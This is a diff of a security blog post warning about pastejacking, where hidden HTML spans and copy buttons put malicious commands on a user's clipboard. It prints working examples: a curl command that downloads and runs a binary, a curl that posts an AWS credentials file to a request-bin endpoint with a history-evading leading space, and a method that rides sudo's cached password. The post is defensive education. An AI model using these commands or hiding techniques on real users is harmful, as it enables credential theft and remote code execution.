@@ -4,9 +4,11 @@ emoji: 🗒️
 asset: "/assets/posts/dont-trust-your-clipboard"
 ---
 
-At first glance, copying and pasting code from the internet appears innocuous and is a daily practice. It's common to copy code from various online sources everyday without a second thought, however, just as hackers exploit our desensitization to opening emails and clicking on links, programmers can also become accustomed to the potential risks of copying and pasting code into their terminals.
+At first glance, copying and pasting code from the internet appears innocuous and is a daily practice. It's common to copy code from various online sources everyday without a second thought, however, just as hackers exploit our desensitization to opening emails and clicking on links, we can also become accustomed to the potential risks of copying and pasting code into their terminals.
 
 Before warned, this post highlights the importance of being cautious when copying and pasting text from the internet, and the content below is no exception. While I cannot prevent you from copying the code yourself, I urge you to proceed with caution.
+
+## Arbitrary Code Execution
 
 One of my favorite examples of why you should exercise caution when running copy and paste commands from websites is the git gist authored by `frankbi`.
 
@@ -48,8 +50,7 @@ The examples above are not inherently harmful, but they lead individuals to trus
 
 <div id="totallysafeandhelpful">
   <h3>Welcome to totally-safe-and-helpful.blog</h3>
-  <h5>By BadActor666</h5>
-  <p>Today we are going to give you a couple of useful docker commands. Lets jump right into it! You can copy all the commands into your terminal using the handy copy button!</p>
+  <p>Today we are going to give you a couple of useful docker commands. You can copy all the commands into your terminal using the handy copy button!</p>
   <table>
     <td style="vertical-align: middle; width: 100%">
       <div class="code nocopy">docker rmi $(docker images -a -q)</div>
@@ -115,7 +116,6 @@ Lets go back to Look at another post from  totally-safe-and-helpful.blog.
 <div id="totallysafeandhelpful">
 
   <h3>Welcome back to totally-safe-and-helpful.blog</h3>
-  <h5>By BadActor666</h5>
 
   Today we are going to explore how to find the files taking up all your harddisk space using the <b>du</b> command.
 
@@ -145,13 +145,13 @@ Seems safe enough; Looks like any other code snippet on the internet. You can se
 </div>
 ```
 
-This time `BadActor666` used a `<span>` tag inside of a `<div>`. A `<span>` tag is a inline container similar to `<b>` and `<i>`. It is used to apply styles to text. For example: Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.
+This time the bad actor used a `<span>` tag inside of a `<div>`. A `<span>` tag is a inline container similar to `<b>` and `<i>`. It is used to apply styles to text. For example: Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.
 
 ```
 <p>Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.</p>
 ```
 
-This allows us to add style to text, but the browser allows the copy without the the format applied. The BadActor666 `<span>` contains the styling of `position: absolute; top: -200px; left: -200px;` which puts the text off screen in the upper left corner of the browser window. Even though you can't see it doesn't mean its not copied. When the `du` command is highlighted so is the text in the `<span>`. Here is what is copied to your clipboard.
+This allows us to add style to text, but the browser allows the copy without the the format applied. The `<span>` contains the styling of `position: absolute; top: -200px; left: -200px;` which puts the text off screen in the upper left corner of the browser window. Even though you can't see it doesn't mean its not copied. When the `du` command is highlighted so is the text in the `<span>`. Here is what is copied to your clipboard.
 
 ```
 du -hs *; curl -s -L https://nickstanley574.github.io//assets/posts/dont-trust-your-clipboard/sl --output sl; chmod +x sl; ./sl; clear;
@@ -173,17 +173,15 @@ Reading package lists... Done
 ...
 nick /home $ sudo apt-get install nginx
 Reading package lists... Done
-...
-nick /home $
 ```
 
 Notice for the second `sudo` command it didn't require a password. The `sudo` command has a `timestamp_timeout` feature that specifies the amount of time that can pass before `sudo` asks for a password again. This allows users to execute multiple privileged commands in a short period without having to repeatedly enter their password. The default value for this feature is 5 minutes.
 
-Hackers can start by initiating a genuine sudo command that prompts the user for their password, and then proceed to execute a hidden malicious command during copy and paste using the subsequent sudo command. This could result in the installation of spyware or ransomware on the system, among other malicious actions.
+Hackers can start by initiating a genuine sudo command that prompts the user for their password, and then proceed to execute a hidden malicious command during copy and paste using the subsequent sudo command. This could result in the installation of spyware or ransomware on the system, among other actions.
 
 ### Attack Avenue 2
 
-AWS credentials are stored in plaintext and is owned by the current user `~/.aws/credentials` It is the same story for your ssh private keys stored in `.ssh`. This means sudo is not required to access these creds. This means anything you run as your used could get access to these secrets. 
+AWS credentials are stored in plaintext and is normally owned by the current user in that user's home folder, by default the path is `~/.aws/credentials`. When the user is the owner, then there's no need to use sudo to access these credentials. As a result, any process executed under the user's account would be able to gain access to these confidential information. 
 
 To demonstrate this we are going to use RequestBin. RequestBin is a web-based tool that allows you to inspect and debug HTTP requests. It provides a unique URL that you can use to send HTTP requests to, and then allows you to inspect the request in real-time. 
 
@@ -221,16 +219,12 @@ function nefariousCopy2(n) {
 }
 </script>
 
-The copy button will copy the following command, but only on the first click. After the first click the real command will be copied.
+The copy button will copy the following command.
 
 {: .no-code-wrap}
 $  curl -s -d "$(cat ~/.aws/credentials-fake)" https://envbrzdr9hp9.x.pipedream.net/ > /dev/null; top -d 0.25 -c; clear;
 
-This is lower the chance of the end user noticing something is a miss. The ony indication that something is off is the terminal being cleared and the malous command is still copied to the clipboard. For a use to realize they have been compromised they would have to recognize the terminal clear being unusual before the copy something else to the clipboard. 
-
-There are some subtleties to this commands that we should explore. 
-
-Notice the space between the $ prompt and the command itself. This will prevent the command from being saved to your bash history ([See HISTCONTROL](https://ss64.com/bash/history.html)). This means that the command will send the contents of the aws cred file to the RequestBin/pipedream endpoint, run the expect command, then clear terminal window, and nothing will be saved to the 
+There are some subtleties to this commands that we should explore. Notice the space between the extra `$` prompt and the command itself. This will prevent the command from being saved to your bash history ([See HISTCONTROL](https://ss64.com/bash/history.html)). This means that the command will send the contents of the aws cred file to the RequestBin/pipedream endpoint, run the expect command, then clear terminal window, and nothing will be saved to the bash history.
 
 <div style="text-align: center;">
 <video style="max-width: 85%;"  controls>
@@ -239,11 +233,12 @@ Notice the space between the $ prompt and the command itself. This will prevent 
 </video>
 </div>
 
+The ony indication that something is off is the terminal being cleared and the command is still copied to the clipboard. For a use to realize they have been compromised they would have to recognize the terminal clear being unusual before the copy something else to the clipboard. 
 
 ## Where do we go from here? 
 
 To not copy from the internet would be crazy, but to mitigate the risk, I do not directly copy and paste text into the terminal. Instead, I paste the text into a plaintext editor, review the command, and then paste or rewrite it into the terminal. It takes a bit longer, but when working on systems that have access to either my personal or client data, the extra time is worth the added security.
 
-Another option is to prevent critical systems from having any type of access to the internet. Instead, make sure nothing can reach the internet and have dependencies, package repose and other resources be in some type of artifacts store. This way even if something malicious is copied there is no way to download from or upload to the internet. 
+In a enterprise environment, another option is to prevent critical systems from having any type of access to the internet. Instead, make sure nothing can reach the internet and have dependencies, package repos, and other external resources be in some type of internal artifacts store. This way even if something malicious is copied there is no way to download from or upload to the internet. 
 
 Sharing code is amazing, but just like everything else be safe, be responsible, and be smart. 
